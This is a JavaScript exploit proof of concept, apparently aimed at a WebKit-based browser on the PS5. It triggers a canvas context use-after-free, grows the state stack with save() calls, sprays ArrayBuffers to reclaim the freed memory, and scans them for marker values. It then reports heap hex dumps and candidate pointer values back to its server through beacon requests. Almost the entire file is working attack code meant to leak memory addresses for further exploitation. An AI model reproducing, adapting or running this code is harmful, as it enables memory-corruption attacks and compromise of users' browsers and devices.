// p497 — Canvas UAF: stateStack Vector buffer reclaim for pointer leak
//
// THEORY: save() grows m_stateStack (Vector<State,1>). When Vector reallocates:
// 1. New buffer allocated at 2x capacity
// 2. States moved to new buffer (move constructor + destructor)
// 3. Old buffer freed to FastMalloc (NO zeroing)
//
// After move: RefPtr/String fields are null in old buffer (destructor ran)
// BUT: doubles (lineWidth, miterLimit, globalAlpha, lineDashOffset, AffineTransform)
//      AND the raw moved-from bytes of CanvasStyle variant remain.
//
// MORE IMPORTANTLY: when State has non-trivially-moveable members, the
// destructor clears smart pointers, but the RAW BYTES at the old address
// are NOT zeroed by FastMalloc after free.
//
// If we spray ABs of matching size immediately after the free, FastMalloc
// may return the old buffer. We then read through DataView to find:
// - Font pointer bytes (FontProxy internals)
// - CanvasStyle variant bytes (may have partial pointer data)
// - AffineTransform doubles (known values = offset calibration)
//
// The AffineTransform doubles act as MARKERS: we set them to known values
// before save(), then scan ABs for those exact doubles to find the reclaimed buffer.
//
// Beacon prefix: V497-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushBeacons() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V497-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V497-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Create aliased pair ═══
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('MISS', 'lw=' + lw1);
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('ALIAS', 'idx=' + idx1);

  // Verify bidirectional
  sprayX[idx1].lineWidth = 777.25;
  if (dCtx1.lineWidth !== 777.25) { B('ABORT', 'verify-fail'); return; }

  // ═══ PHASE 2: Prepare distinctive state for marker ═══
  // Set transform to unique marker doubles
  var MARKER_A = 3.141592653589793;  // pi
  var MARKER_B = 2.718281828459045;  // e
  var MARKER_C = 1.4142135623730951; // sqrt(2)
  var MARKER_D = 1.7320508075688772; // sqrt(3)
  var MARKER_E = 42.424242424242;
  var MARKER_F = 99.999999999999;

  sprayX[idx1].setTransform(MARKER_A, MARKER_B, MARKER_C, MARKER_D, MARKER_E, MARKER_F);
  sprayX[idx1].lineWidth = 123456.789;
  sprayX[idx1].miterLimit = 654321.123;
  sprayX[idx1].globalAlpha = 0.31415926;
  sprayX[idx1].lineDashOffset = 271828.18284;
  sprayX[idx1].shadowOffsetX = 1234.5;
  sprayX[idx1].shadowOffsetY = 6789.0;
  sprayX[idx1].shadowBlur = 42.42;

  // Set a gradient to get a C++ pointer stored in the variant
  var grad = sprayX[idx1].createLinearGradient(0, 0, 100, 100);
  grad.addColorStop(0, '#ff0000');
  grad.addColorStop(1, '#0000ff');
  sprayX[idx1].fillStyle = grad;

  // Set a large lineDash to force Vector<double> heap allocation
  var dashPattern = [];
  for (var i = 0; i < 50; i++) dashPattern.push(i + 0.12345);
  sprayX[idx1].setLineDash(dashPattern);

  B('STATE-SET', 'markers-ready');

  // ═══ PHASE 3: Grow stateStack to trigger reallocation ═══
  // Vector<State,1> starts with inline capacity 1 (the initial state).
  // save() increments m_unrealizedSaveCount.
  // Reading any property triggers realizeSaves() which does append().
  //
  // Growth pattern: capacity 1 → 2 → 4 → 8 → 16 → 32
  // Each growth frees the old buffer.
  //
  // We want to catch the freed buffer at a known size.
  // After 4 saves + realize: capacity grows to 8 (holds 5 states).
  //   Buffer size = 8 * sizeof(State)
  // After 8 saves + realize: capacity grows to 16 (holds 9 states).
  //   Old buffer (8 * sizeof(State)) is freed.

  // Strategy: do saves in stages, spray ABs after each growth

  // Stage A: 1→2 save (triggers first heap alloc from inline)
  sprayX[idx1].save();
  var tmp = sprayX[idx1].lineWidth; // triggers realizeSaves

  // Stage B: 2→4
  sprayX[idx1].save();
  sprayX[idx1].save();
  tmp = sprayX[idx1].lineWidth;

  // Stage C: 4→8 — old buffer (4 * sizeof(State)) freed
  sprayX[idx1].save();
  sprayX[idx1].save();
  sprayX[idx1].save();
  sprayX[idx1].save();
  tmp = sprayX[idx1].lineWidth;

  B('GROW-8', 'statestack-at-8');

  // Stage D: 8→16 — old buffer (8 * sizeof(State)) freed
  // THIS is the buffer we want to reclaim.
  // First, note: all 8 states have our marker values.

  // Do 8 more saves to trigger 8→16 growth
  for (var i = 0; i < 8; i++) sprayX[idx1].save();
  tmp = sprayX[idx1].lineWidth; // triggers realizeSaves → growth to 16
  // Old buffer (8 * sizeof(State)) is now FREE in FastMalloc

  B('GROW-16', 'old-8-buf-freed');

  // ═══ PHASE 4: Spray ABs to reclaim freed stateStack buffer ═══
  // sizeof(State) is unknown. We need to try multiple sizes.
  // Estimate: ~200-500 bytes per State
  // 8 * 200 = 1600B, 8 * 300 = 2400B, 8 * 400 = 3200B, 8 * 500 = 4000B
  //
  // Try a range of AB sizes from 1500 to 5000 in steps of 100

  var sprayABs = [];
  var SPRAY_SIZES = [];
  for (var sz = 1500; sz <= 5000; sz += 100) SPRAY_SIZES.push(sz);

  var PER_SIZE = 20;
  for (var si = 0; si < SPRAY_SIZES.length; si++) {
    var sz = SPRAY_SIZES[si];
    for (var i = 0; i < PER_SIZE; i++) {
      var ab = new ArrayBuffer(sz);
      sprayABs.push({ab: ab, sz: sz, view: new DataView(ab)});
    }
  }

  B('SPRAY', 'sizes=' + SPRAY_SIZES.length + ',per=' + PER_SIZE + ',total=' + sprayABs.length);

  // ═══ PHASE 5: Scan ABs for marker doubles ═══
  // Convert marker doubles to their Float64 byte representation
  // pi bytes (little-endian): 18 2D 44 54 FB 21 09 40
  // We scan DataView for getFloat64 matching our markers

  var hits = [];
  for (var i = 0; i < sprayABs.length; i++) {
    var view = sprayABs[i].view;
    var sz = sprayABs[i].sz;
    // Scan every 8-byte aligned offset for marker doubles
    for (var off = 0; off + 8 <= sz; off += 8) {
      var val = view.getFloat64(off, true);
      if (val === MARKER_A || val === MARKER_B || val === MARKER_C ||
          val === MARKER_D || val === MARKER_E || val === MARKER_F ||
          val === 123456.789 || val === 654321.123 || val === 271828.18284) {
        hits.push({i: i, sz: sz, off: off, val: val});
      }
    }
  }

  B('SCAN1', 'hits=' + hits.length);

  if (hits.length > 0) {
    // Report first 10 hits
    for (var h = 0; h < Math.min(hits.length, 10); h++) {
      var hit = hits[h];
      B('HIT-' + h, 'ab=' + hit.i + ',sz=' + hit.sz + ',off=' + hit.off + ',val=' + hit.val);
    }

    // For the first hit: dump surrounding bytes looking for pointers
    var hit0 = hits[0];
    var v = sprayABs[hit0.i].view;
    var sz = sprayABs[hit0.i].sz;

    // Dump 256 bytes around the hit as hex
    var dumpStart = Math.max(0, hit0.off - 128);
    var dumpEnd = Math.min(sz, hit0.off + 128);
    var hexDump = [];
    for (var off = dumpStart; off + 8 <= dumpEnd; off += 8) {
      var lo = v.getUint32(off, true);
      var hi = v.getUint32(off + 4, true);
      if (lo !== 0 || hi !== 0) {
        hexDump.push(off + ':' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
      }
    }

    // Send hex dump in chunks
    var dumpStr = hexDump.join(',');
    if (dumpStr.length > 800) {
      B('DUMP-1', dumpStr.substring(0, 800));
      B('DUMP-2', dumpStr.substring(800, 1600));
      if (dumpStr.length > 1600) B('DUMP-3', dumpStr.substring(1600, 2400));
    } else {
      B('DUMP', dumpStr);
    }

    // Also scan entire reclaimed buffer for pointer-like values
    // Pointers on PS5: 0x000000XX_XXXXXXXX (48-bit virtual addresses)
    var ptrs = [];
    for (var off = 0; off + 8 <= sz; off += 8) {
      var lo = v.getUint32(off, true);
      var hi = v.getUint32(off + 4, true);
      // Check for plausible heap pointer: hi in range 0x0000-0x0FFF, lo nonzero
      if (hi > 0 && hi < 0x1000 && lo !== 0) {
        ptrs.push(off + ':0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
      }
    }
    B('PTR-SCAN', 'count=' + ptrs.length + (ptrs.length > 0 ? ',first=' + ptrs[0] : ''));
    if (ptrs.length > 0 && ptrs.length <= 20) {
      B('ALL-PTRS', ptrs.join(','));
    } else if (ptrs.length > 20) {
      B('PTRS-20', ptrs.slice(0, 20).join(','));
    }

  } else {
    // No marker found. Maybe sizeof(State) is different than expected.
    // Also try: scan for ANY non-zero content in ANY AB
    var anyNonZero = 0;
    for (var i = 0; i < Math.min(sprayABs.length, 50); i++) {
      var view = sprayABs[i].view;
      var sz = sprayABs[i].sz;
      for (var off = 0; off < sz; off += 4) {
        if (view.getUint32(off, true) !== 0) { anyNonZero++; break; }
      }
    }
    B('NO-MARKER', 'nonZeroABs=' + anyNonZero + ' of 50 checked');

    // Try larger sizes: maybe sizeof(State) is bigger
    var bigSpray = [];
    var BIG_SIZES = [5000, 6000, 7000, 8000, 10000, 12000, 16000, 20000, 25000, 32000];
    for (var si = 0; si < BIG_SIZES.length; si++) {
      for (var i = 0; i < 10; i++) {
        var ab = new ArrayBuffer(BIG_SIZES[si]);
        bigSpray.push({ab: ab, sz: BIG_SIZES[si], view: new DataView(ab)});
      }
    }

    var bigHits = 0;
    for (var i = 0; i < bigSpray.length; i++) {
      var view = bigSpray[i].view;
      var sz = bigSpray[i].sz;
      for (var off = 0; off + 8 <= sz; off += 8) {
        var val = view.getFloat64(off, true);
        if (val === MARKER_A || val === 123456.789 || val === 654321.123) {
          bigHits++;
          B('BIG-HIT', 'sz=' + sz + ',off=' + off + ',val=' + val);
          break;
        }
      }
    }
    B('BIG-SCAN', 'hits=' + bigHits);
  }

  // ═══ PHASE 6: Also try 16→32 growth ═══
  // Do 16 more saves to trigger another growth
  for (var i = 0; i < 16; i++) sprayX[idx1].save();
  tmp = sprayX[idx1].lineWidth;
  // Old buffer (16 * sizeof(State)) freed

  B('GROW-32', 'old-16-buf-freed');

  // Spray ABs for the larger freed buffer
  var spray32 = [];
  var SIZES_32 = [];
  for (var sz = 3000; sz <= 10000; sz += 200) SIZES_32.push(sz);
  for (var si = 0; si < SIZES_32.length; si++) {
    for (var i = 0; i < 15; i++) {
      var ab = new ArrayBuffer(SIZES_32[si]);
      spray32.push({ab: ab, sz: SIZES_32[si], view: new DataView(ab)});
    }
  }

  var hits32 = [];
  for (var i = 0; i < spray32.length; i++) {
    var view = spray32[i].view;
    var sz = spray32[i].sz;
    for (var off = 0; off + 8 <= sz; off += 8) {
      var val = view.getFloat64(off, true);
      if (val === MARKER_A || val === 123456.789 || val === 654321.123) {
        hits32.push('sz=' + sz + ',off=' + off + ',val=' + val.toFixed(4));
        break;
      }
    }
  }
  B('SCAN32', 'hits=' + hits32.length + (hits32.length > 0 ? ',first=' + hits32[0] : ''));

  // Clean up: restore all the saves to avoid memory bloat
  // (MaxSaveCount is 16*1024, we're well below)

  Q('DONE', 'complete');
  flushBeacons();
})();
